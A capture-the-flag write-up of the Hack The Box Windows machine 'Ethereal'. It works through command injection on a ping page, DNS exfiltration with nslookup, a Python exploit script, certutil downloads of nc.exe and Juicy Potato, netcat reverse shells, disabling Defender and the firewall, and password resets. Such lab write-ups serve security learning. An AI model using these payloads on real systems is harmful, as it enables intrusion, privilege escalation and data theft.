---
layout: single
title: Ethereal - Hack The Box
excerpt: This is the writeup for Ethereal, a very difficult Windows machine that I solved using the unintented rotten potato method before the box was patched by the HTB staff.
date: 2019-03-09
classes: wide
header:
  teaser: /assets/images/htb-writeup-ethereal/ethereal_logo.png
categories:
  - hackthebox
  - infosec
tags:
  - ms-dos
  - dns exfiltration
  - command injection
  - rotten potato
  - unintended
  - efs
---

![](/assets/images/htb-writeup-ethereal/ethereal_logo.png)

Ethereal was a really difficult box from [MinatoTW](https://www.secjuice.com/author/minatotw/) and [egre55](https://www.hackthebox.eu/home/users/profile/1190) that I solved using an unintended priv esc method with Rotten Potato. The box was patched soon after the release to block that priv esc route. The box had some trivial command injection in the Test Connection page but since pretty much everything was blocked outbound I had to use DNS exfiltration to get the output from my commands. Once I got SYSTEM access via Potato, I found `user.txt` and `root.txt` were encrypted and couldn't be read as `NT AUTHORITY\SYSTEM`. At that point, I've spent a lot of hours on this box and I just wanted to get the flags so I changed both users's password and RDP'ed in and was able to see the flags.

## Quick summary

- Find the MS-DOS password manager file FDISK.zip on the FTP server
- Run Dosbox, downloading missing dependies for pbox.exe, retrieve passwords after guessing the secret key
- Find the command injection vulnerability on the "Ping" page
- Use command injection vulnerability to scan open outbound ports, find TCP ports 73 and 136
- Use certutil.exe to download nc.exe on the box, get a shell as user IIS
- Use certutil.exe to download Juicy Potato on the box, get a shell as SYSTEM
- Disable Windows Defender & Windows Firewall
- Change passwords for users `jorge` and `rupal`, then RDP into the box to get both `user.txt` and `root.txt` flags

## Detailed steps

### Portscan

```
root@darkisland:~/hackthebox/Machines/Ethereal# nmap -sC -sV -oA ethereal 10.10.10.106
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-08 13:35 EDT
Nmap scan report for ethereal.htb (10.10.10.106)
Host is up (0.10s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 172.16.249.135 is not the same as 10.10.10.106
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ethereal
8080/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=ethereal.htb
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.65 seconds
```

### FTP enumeration

Anonymous access is allowed on the FTP server.

```
root@darkisland:~/hackthebox/Machines/Ethereal# ftp 10.10.10.106
Connected to 10.10.10.106.
220 Microsoft FTP Service
Name (10.10.10.106:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
07-10-18  10:03PM       <DIR>          binaries
09-02-09  09:58AM                 4122 CHIPSET.txt
01-12-03  09:58AM              1173879 DISK1.zip
01-22-11  09:58AM               182396 edb143en.exe
01-18-11  12:05PM                98302 FDISK.zip
07-10-18  09:59PM       <DIR>          New folder
07-10-18  10:38PM       <DIR>          New folder (2)
07-09-18  10:23PM       <DIR>          subversion-1.10.0
11-12-16  09:58AM                 4126 teamcity-server-log4j.xml
226 Transfer complete.
```

We'll download all the files to our Kali box so it's easier to look at files:

```
root@darkisland:~/hackthebox/Machines/Ethereal# wget -r --no-passive ftp://10.10.10.106
--2018-10-08 13:38:09--  ftp://10.10.10.106/
           => ‘10.10.10.106/.listing’
Connecting to 10.10.10.106:21... connected.
```

### Password manager

There's a lot of files on the FTP, the interesting one is `FDISK.zip`.

First, we'll unzip it and determine it's a FAT filesystem.

```
root@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# unzip FDISK.zip 
Archive:  FDISK.zip
  inflating: FDISK

root@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# file FDISK
FDISK: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID "MSDOS5.0", root entries 224, sectors 2880
 (volumes <=32 MB), sectors/FAT 9, sectors/track 18, serial number 0x5843af55, unlabeled, FAT (12 bit), followed by FAT
```

After mounting it, we found there's an MS-DOS executable `pbox.exe` file in there.

```
root@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# mount -t vfat -o loop FDISK /mnt
root@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# ls -l /mnt
total 1
drwxr-xr-x 2 root root 512 Jul  2 19:16 pbox
root@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# ls -l /mnt/pbox
total 80
-rwxr-xr-x 1 root root   284 Jul  2 19:05 pbox.dat
-rwxr-xr-x 1 root root 81384 Aug 25  2010 pbox.exe

root@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# file /mnt/pbox/pbox.exe
/mnt/pbox/pbox.exe: MS-DOS executable, COFF for MS-DOS, DJGPP go32 DOS extender, UPX compressed
```

To run this, we'll use `dosbox` and mount the Kali directory inside MS-DOS.

```
root@darkisland:~/hackthebox/Machines/Ethereal/10.10.10.106# cd /mnt/pbox/
root@darkisland:/mnt/pbox# dosbox
DOSBox version 0.74-2
Copyright 2002-2018 DOSBox Team, published under GNU GPL.
---
CONFIG:Loading primary settings from config file /root/.dosbox/dosbox-0.74-2.conf
MIXER:Got different values from SDL: freq 44100, blocksize 512
ALSA:Can't subscribe to MIDI port (65:0) nor (17:0)
MIDI:Opened device:none
```

![](/assets/images/htb-writeup-ethereal/dosbox1.png)

We are missing a dependency to be able to run pbox.exe

After a bit of googling, I found the missing dependency:

![](/assets/images/htb-writeup-ethereal/dosbox2.png)

```
root@darkisland:/mnt/pbox# wget http://teadrinker.net/tdold/mr/cwsdpmi.zip
--2018-10-08 13:47:19--  http://teadrinker.net/tdold/mr/cwsdpmi.zip
Resolving teadrinker.net (teadrinker.net)... 46.30.213.33, 2a02:2350:5:100:c840:0:24b2:20fb
Connecting to teadrinker.net (teadrinker.net)|46.30.213.33|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16799 (16K) [application/zip]
Saving to: ‘cwsdpmi.zip’

cwsdpmi.zip               100%[=====================================>]  16.41K  --.-KB/s    in 0.1s    

2018-10-08 13:47:20 (125 KB/s) - ‘cwsdpmi.zip’ saved [16799/16799]

root@darkisland:/mnt/pbox# unzip cwsdpmi.zip 
Archive:  cwsdpmi.zip
  inflating: CWSDPMI.EXE
```

Now we can run the password manager, but it asks for a password.

![](/assets/images/htb-writeup-ethereal/dosbox3.png)

The password is easily guessed: `password`, we now have access to all the passwords.

![](/assets/images/htb-writeup-ethereal/dosbox4.png)

Found multiple credentials; the only one that is useful is: `!C414m17y57r1k3s4g41n!`

### Web enumeration

There's a ton of useless crap and decoys on this box, notably:
- Fake desktop with a troll face & flag
- Fake members login page

There's an administration page at `http://ethereal.htb:8080/`

![](/assets/images/htb-writeup-ethereal/web1.png)

We can log in with:
- username: `alan`
- password: `!C414m17y57r1k3s4g41n!`

Note: We can guess the username since the name Alan is mentionned in the notes and in some of the password manager entries

![](/assets/images/htb-writeup-ethereal/web2.png)

### Command injection using ping page

We can run commands by adding `&& <command>` in the command field.

We can validate we got RCE by pinging ourselves with `127.0.0.1 && ping 10.10.14.23`.

The first IP is implicitely pinged by the script followed by our injected command after &&:

```
root@darkisland:~/hackthebox/Machines/Ethereal# tcpdump -nni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
14:30:51.029999 IP 10.10.10.106 > 10.10.14.23: ICMP echo request, id 1, seq 39, length 40
14:30:51.030129 IP 10.10.14.23 > 10.10.10.106: ICMP echo reply, id 1, seq 39, length 40
14:30:52.046783 IP 10.10.10.106 > 10.10.14.23: ICMP echo request, id 1, seq 40, length 40
14:30:52.046814 IP 10.10.14.23 > 10.10.10.106: ICMP echo reply, id 1, seq 40, length 40
```

We can't run any other commands like `certutil.exe` or `powershell.exe`, AppLocker is probably enabled on the box.

However we can exfil some data by using `nslookup`.

For example, using the payload `127.0.0.1 && nslookup inject 10.10.14.23`, we get can get the box to do a query back to us:

```
root@darkisland:~# tcpdump -nni tun0 -vv port 53
tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
20:20:16.625986 IP (tos 0x0, ttl 127, id 8724, offset 0, flags [none], proto UDP (17), length 70)
    10.10.10.106.52125 > 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)
20:20:18.652075 IP (tos 0x0, ttl 127, id 8726, offset 0, flags [none], proto UDP (17), length 52)
    10.10.10.106.52126 > 10.10.14.23.53: [udp sum ok] 2+ A? inject. (24)
20:20:20.922359 IP (tos 0x0, ttl 127, id 8727, offset 0, flags [none], proto UDP (17), length 52)
    10.10.10.106.52127 > 10.10.14.23.53: [udp sum ok] 3+ AAAA? inject. (24)
```

What we want is to exfil the output of commands, by using the following payload we can start to output some stuff:

`FOR /F "tokens=1" %g IN 'whoami' do (nslookup %g 10.10.14.23)`

Output:

```
20:30:23.082437 IP (tos 0x0, ttl 127, id 8942, offset 0, flags [none], proto UDP (17), length 58)
    10.10.10.106.63713 > 10.10.14.23.53: [udp sum ok] 2+ A? etherealalan. (30)
```

Now, it's not perfect, we can't exfil special characters or anything else that is not a valid character in a DNS query. So in the query above, we can guess that the real output should be `ethereal\alan` instead of `etherealalan`.

So if we're listing directories, we have to use the /b flag so it only returns the name of the directory/file otherwise we'll need to play with the token parameter to indicate which item to read from the output.

Another example listing directories: `FOR /F "tokens=1" %g IN 'dir /b c:\users' do (nslookup %g 10.10.14.23)`

```
20:35:04.531929 IP (tos 0x0, ttl 127, id 9016, offset 0, flags [none], proto UDP (17), length 70)
    10.10.10.106.53805 > 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)
20:35:06.823075 IP (tos 0x0, ttl 127, id 9017, offset 0, flags [none], proto UDP (17), length 70)
    10.10.10.106.53806 > 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)
20:35:08.851451 IP (tos 0x0, ttl 127, id 9018, offset 0, flags [none], proto UDP (17), length 70)
    10.10.10.106.53807 > 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)
20:35:10.839111 IP (tos 0x0, ttl 127, id 9019, offset 0, flags [none], proto UDP (17), length 59)
    10.10.10.106.53808 > 10.10.14.23.53: [udp sum ok] 2+ A? Administrator. (31)
20:35:12.854740 IP (tos 0x0, ttl 127, id 9020, offset 0, flags [none], proto UDP (17), length 59)
    10.10.10.106.53809 > 10.10.14.23.53: [udp sum ok] 3+ AAAA? Administrator. (31)
20:35:14.895892 IP (tos 0x0, ttl 127, id 9021, offset 0, flags [none], proto UDP (17), length 70)
    10.10.10.106.53810 > 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)
20:35:16.886216 IP (tos 0x0, ttl 127, id 9022, offset 0, flags [none], proto UDP (17), length 50)
    10.10.10.106.53811 > 10.10.14.23.53: [udp sum ok] 2+ A? alan. (22)
20:35:19.474240 IP (tos 0x0, ttl 127, id 9023, offset 0, flags [none], proto UDP (17), length 50)
    10.10.10.106.53812 > 10.10.14.23.53: [udp sum ok] 3+ AAAA? alan. (22)
20:35:21.312568 IP (tos 0x0, ttl 127, id 9025, offset 0, flags [none], proto UDP (17), length 70)
    10.10.10.106.56757 > 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)
20:35:23.309541 IP (tos 0x0, ttl 127, id 9028, offset 0, flags [none], proto UDP (17), length 51)
    10.10.10.106.56758 > 10.10.14.23.53: [udp sum ok] 2+ A? jorge. (23)
20:35:25.299775 IP (tos 0x0, ttl 127, id 9029, offset 0, flags [none], proto UDP (17), length 51)
    10.10.10.106.56759 > 10.10.14.23.53: [udp sum ok] 3+ AAAA? jorge. (23)
20:35:27.338241 IP (tos 0x0, ttl 127, id 9031, offset 0, flags [none], proto UDP (17), length 70)
    10.10.10.106.56760 > 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)
20:35:29.355372 IP (tos 0x0, ttl 127, id 9032, offset 0, flags [none], proto UDP (17), length 52)
    10.10.10.106.56761 > 10.10.14.23.53: [udp sum ok] 2+ A? Public. (24)
20:35:31.523795 IP (tos 0x0, ttl 127, id 9034, offset 0, flags [none], proto UDP (17), length 52)
    10.10.10.106.56762 > 10.10.14.23.53: [udp sum ok] 3+ AAAA? Public. (24)
20:35:33.646114 IP (tos 0x0, ttl 127, id 9035, offset 0, flags [none], proto UDP (17), length 70)
    10.10.10.106.56763 > 10.10.14.23.53: [udp sum ok] 1+ PTR? 23.14.10.10.in-addr.arpa. (42)
20:35:35.669198 IP (tos 0x0, ttl 127, id 9038, offset 0, flags [none], proto UDP (17), length 51)
    10.10.10.106.58924 > 10.10.14.23.53: [udp sum ok] 2+ A? rupal. (23)
20:35:37.681147 IP (tos 0x0, ttl 127, id 9040, offset 0, flags [none], proto UDP (17), length 51)
    10.10.10.106.58925 > 10.10.14.23.53: [udp sum ok] 3+ AAAA? rupal. (23)
```

We just listed `c:\users` and found the following directories:

- c:\users\Administrator
- c:\users\alan
- c:\users\jorge
- c:\users\rupal

Doing things manually takes a long time so I started working on a python script to automate the process. [Overcast](https://www.hackthebox.eu/home/users/profile/9682) [[Blog](https://www.justinoblak.com/)] was also working on the box and was one step ahead of me. He shared with me a script he had already created.

```python
#!/usr/bin/python3

from socket import *
from requests_futures.sessions import FuturesSession
import time
import select


s = socket(AF_INET, SOCK_DGRAM)
s.settimeout(10)
s.bind(('10.10.14.23', 53))

def recv():
    print("[+] Receiving data:")
    try:
        while True:
            data = s.recv(1024)
            if data[1] == 2: # A record
                print(data[13:-5])
    except Exception as e:
        print(e)
        print("[!] Done")
        return

def send(cmd, col):
    session = FuturesSession()
    session.post("http://ethereal.htb/p1ng/", data=
            {
                "__VIEWSTATE": "/wEPDwULLTE0OTYxODU3NjhkZD0G/ny1VOoO1IFda8cKvyAZexSk+Y22QbXBRP0gxbre",
                "__VIEWSTATEGENERATOR": "A7095145",
                "__EVENTVALIDATION": "/wEdAAOZvFNfMAAnpqKRCMR2SHn/4CgZUgk3s462EToPmqUw3OKvLNdlnDJuHW3p+9jPAN/siIFmy9ZoaWu7BT0ak0x7Uttp88efMu6vUQ1geHQSWQ==",
                "search": f"127.0.0.1 && FOR /F \"tokens={col}\" %g IN ('{cmd}') do (nslookup %g 10.10.14.23)",
                "ctl02": ""
            },
            proxies={"http": "127.0.0.1:8080"})

def shell():
    while 1:
        cmd = input("$> ")
        if cmd == "exit":
            s.close()
            exit()
        else:
            col = input("(col#)> ")
            if col == '':
                col = 1
            else:
                col = int(col)
            send(cmd, col)
            recv()

if __name__ == '__main__':
    shell()
```    

We still need to mess with the token parameter when we have output with spaces in it, but it make things but more manageable.

**whoami**
```
root@darkisland:~/hackthebox/Machines/Ethereal# ./exfil_alan.py 
$> whoami
(col#)> 
[+] Receiving data:
b'etherealalan'
```

**dir c:\users\alan**
```
$> dir /b c:\users\alan
(col#)> 
[+] Receiving data:
b'Contacts'
b'Desktop'
b'Documents'
b'Downloads'
b'Favorites'
b'Links'
b'Music'
b'Pictures'
b'Saved'
b'Searches'
b'Videos'
```

**dir c:\users\alan\desktop**
```
$> dir /b c:\users\alan\desktop
(col#)> 
[+] Receiving data:
b'note-draft\x03txt'
```

Too bad, there's no flag... let's keeping looking.

**dir c:\inetpub\wwwroot**
```
$> dir /b c:\inetpub\wwwroot
(col#)> 
[+] Receiving data:
b'corp'
b'default\x04aspx'
b'p1ng'
timed out
```

Interesting, there's a directory `p1ng`, let's check check it out:

![](/assets/images/htb-writeup-ethereal/web3.png)

Wow, so we didn't even need the credentials from the password manager have we known this hidden path.

I got really stuck at this point and spent the next several hours trying to find ways to get a proper shell, or find hidden files that would allow me to get unstuck. I didn't get far until at some point after I had switched the path invoked by the script to use the unauthenticated page on port 80, I realized that the `whoami` output I was now getting was different.

```
root@darkisland:~/hackthebox/Machines/Ethereal# ./exfil_iis.py 
$> whoami
(col#)> 
[+] Receiving data:
b'iis'
```

Ok, so the webserver on port 80 is not running with the same user as port 8080.

After wasting a few more hours, I realized that AppLocker isn't enabled for user `IIS`. I suspected that the outbound ports on the box would be firewalled so I used a boolean blind approach to test various commands. The following payload will ping my machine only if the preceding command has been successfully executed: `127.0.0.1 && whoami && ping 10.10.14.23`.

To test this, I first tried a command that I know will work: `127.0.0.1 && whoami && ping 10.10.14.23`

```
root@darkisland:~# tcpdump -nni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
21:02:19.817657 IP 10.10.10.106 > 10.10.14.23: ICMP echo request, id 1, seq 63, length 40
21:02:19.817712 IP 10.10.14.23 > 10.10.10.106: ICMP echo reply, id 1, seq 63, length 40
21:02:20.777578 IP 10.10.10.106 > 10.10.14.23: ICMP echo request, id 1, seq 64, length 40
21:02:20.777608 IP 10.10.14.23 > 10.10.10.106: ICMP echo reply, id 1, seq 64, length 40
21:02:21.768882 IP 10.10.10.106 > 10.10.14.23: ICMP echo request, id 1, seq 65, length 40
21:02:21.768933 IP 10.10.14.23 > 10.10.10.106: ICMP echo reply, id 1, seq 65, length 40
21:02:22.919376 IP 10.10.10.106 > 10.10.14.23: ICMP echo request, id 1, seq 66, length 40
21:02:22.919408 IP 10.10.14.23 > 10.10.10.106: ICMP echo reply, id 1, seq 66, length 40
```

We are getting pinged so it means the command was executed correctly.

Next, our target is `certutil.exe` so we can use it to download files.

First, I tested locally on my Windows machine if running certutil.exe without parameters returns a successful error code. I wanted to do this because I suspected there was an outbound firewall blocking some most ports.

![](/assets/images/htb-writeup-ethereal/boolean1.png)

Then I verified that certutil.exe is not blocked now that we are running as IIS: `127.0.0.1 && certutil.exe && ping 10.10.14.23`.

```
21:06:30.214884 IP 10.10.10.106 > 10.10.14.23: ICMP echo request, id 1, seq 71, length 40
21:06:30.214912 IP 10.10.14.23 > 10.10.10.106: ICMP echo reply, id 1, seq 71, length 40
21:06:31.286151 IP 10.10.10.106 > 10.10.14.23: ICMP echo request, id 1, seq 72, length 40
21:06:31.286182 IP 10.10.14.23 > 10.10.10.106: ICMP echo reply, id 1, seq 72, length 40
```

We're getting pinged so the certutil.exe command didn't error out. 

While previously looking at the files and programs on the box, I found `c:\program files (x86)\OpenSSL-v1.1.0\bin\openssl.exe"` installed (and it wasn't AppLocked for `alan` user either), so I used this to establish outbound sockets.

I modified the existing script to scan for the first 200 ports:

```python 
    for i in range(1, 200):
        time.sleep(2.5)
        cmd = "\"c:\\program files (x86)\\OpenSSL-v1.1.0\\bin\\openssl.exe\" s_client -host 10.10.14.23 -port {}".format(str(i))
        print(cmd)
        send(cmd, 1)
```

I used Wireshark to look for incoming SYN packets and started the scan.

```
root@darkisland:~/hackthebox/Machines/Ethereal# ./scanport.py
[...]
"c:\program files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -host 10.10.14.23 -port 72
"c:\program files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -host 10.10.14.23 -port 73
"c:\program files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -host 10.10.14.23 -port 74
"c:\program files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -host 10.10.14.23 -port 75
[...]
"c:\program files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -host 10.10.14.23 -port 135
"c:\program files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -host 10.10.14.23 -port 136
"c:\program files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -host 10.10.14.23 -port 137
"c:\program files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -host 10.10.14.23 -port 138
```

From the pcap, I identified inbound connections on port 73 and 136.

![](/assets/images/htb-writeup-ethereal/wireshark.png)

Now, we just need to get netcat uploaded to the server and try to get a proper shell.

First, let's start an HTTP listener on port 73 to host nc.exe, then issue `certutil.exe -urlcache -split -f http://10.10.14.23:73/nc.exe c:\users\public\desktop\shortcuts\nc.exe`

And finally, spawn a netcat connection with `c:\users\public\desktop\shortcuts\nc.exe -e cmd.exe 10.10.14.23 136`

We finally got a shell!

![](/assets/images/htb-writeup-ethereal/shell1.png)

### Privesc

Our IIS user has `SeImpersonatePrivilege` so we can probably do Rotten Potato.

```
c:\windows\system32\inetsrv>whoami
iis apppool\defaultapppool

c:\windows\system32\inetsrv>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

I used Juicy Potato from Decoder.

```
c:\windows\system32\inetsrv>cd \users\public 
cd \users\public

c:\Users\Public>cmd /c certutil.exe -urlcache -split -f http://10.10.14.23:73/JuicyPotato.exe JuicyPotato.exe

10/10/2018  02:40 AM    <DIR>          .
10/10/2018  02:40 AM    <DIR>          ..
06/25/2018  03:51 PM    <DIR>          Documents
07/03/2018  10:25 PM    <DIR>          Downloads
10/10/2018  02:40 AM           347,648 JuicyPotato.exe
07/16/2016  02:23 PM    <DIR>          Music
07/16/2016  02:23 PM    <DIR>          Pictures
07/16/2016  02:23 PM    <DIR>          Videos
```

Execute it, spawning yet another netcat:

```
c:\Users\Public>JuicyPotato -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\shortcuts\nc.exe -e cmd.exe 10.10.14.23 73" -t *
JuicyPotato -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\shortcuts\nc.exe -e cmd.exe 10.10.14.23 73" -t *                                                                                
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```

We got a shell as `nt authority\system`!

```
root@darkisland:~/hackthebox/Machines/Ethereal# nc -lvnp 73
listening on [any] 73 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.106] 49877
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

Strange... we don't have read access to the flags even though we are SYSTEM:

```
C:\Windows\system32>cd \users\jorge\desktop
cd \users\jorge\desktop

C:\Users\jorge\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FAD9-1FD5

 Directory of C:\Users\jorge\Desktop

07/08/2018  11:20 PM    <DIR>          .
07/08/2018  11:20 PM    <DIR>          ..
07/04/2018  10:18 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  15,231,598,592 bytes free

C:\Users\jorge\Desktop>type user.txt
type user.txt
Access is denied.
```

Looking at the flags, we see that the file is encrypted:

```
PS C:\users\jorge\desktop> get-itemproperty -path user.txt  | Format-list -Property *
get-itemproperty -path user.txt  | Format-list -Property *


PSPath            : Microsoft.PowerShell.Core\FileSystem::C:\users\jorge\deskto
                    p\user.txt
PSParentPath      : Microsoft.PowerShell.Core\FileSystem::C:\users\jorge\deskto
                    p
PSChildName       : user.txt
[...]
Attributes        : Archive, Encrypted
```

Same thing for the root.txt file in `c:\users\rupal\desktop\root.txt`

I found some cert and private key files on the D: drive

```
PS D:\certs> dir


    Directory: D:\certs


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----         7/1/2018  10:26 PM            772 MyCA.cer                      
-a----         7/1/2018  10:26 PM           1196 MyCA.pvk
```

I thought of googling for ways to recover EFS encrypted files but instead I just YOLOed it:

Attack plan:

- Disable Windows Defender
- Disable Firewall
- Change Rupal and Jorge's passwords
- RDP in and steal their shit

```
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true

PS C:\> NetSh Advfirewall set allprofiles state off
Ok.

PS C:\> net users rupal Yoloed1234!
net users rupal Yoloed1234!
The command completed successfully.

PS C:\> net users jorge Yoloed1234!
net users jorge Yoloed1234!
The command completed successfully.
```

Sweet, RDP is already running, no need to enable it:

```
PS C:\> netstat -an                
netstat -an                        
                                   
Active Connections                 
                                   
  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING
```

At last, we can RDP and get the flags!!

![](/assets/images/htb-writeup-ethereal/jorge.png)

![](/assets/images/htb-writeup-ethereal/rupal.png)